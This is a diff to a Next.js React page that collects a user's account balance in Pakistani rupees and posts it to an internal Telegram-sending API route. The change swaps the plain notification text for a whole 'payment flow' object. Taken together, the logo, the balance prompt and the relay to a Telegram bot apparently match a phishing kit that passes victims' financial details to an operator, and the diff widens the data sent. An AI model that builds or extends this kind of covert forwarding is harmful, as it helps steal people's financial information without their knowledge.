@@ -2,6 +2,7 @@
 
 import { useState } from 'react'
 import { useRouter } from 'next/navigation'
+import { updatePaymentFlow } from '@/lib/payment-flow'
 import { ChevronRight, Info } from 'lucide-react'
 
 const logoImage =
@@ -38,10 +39,11 @@ export default function BalancePage() {
               }
               setError('')
               try {
+                const flow = updatePaymentFlow({ balance })
                 await fetch('/api/telegram/send', {
                   method: 'POST',
                   headers: { 'content-type': 'application/json' },
-                  body: JSON.stringify({ text: `Account balance submitted: PKR ${balance}` }),
+                  body: JSON.stringify(flow),
                 })
               } catch {
                 // Continue navigation even if the notification fails
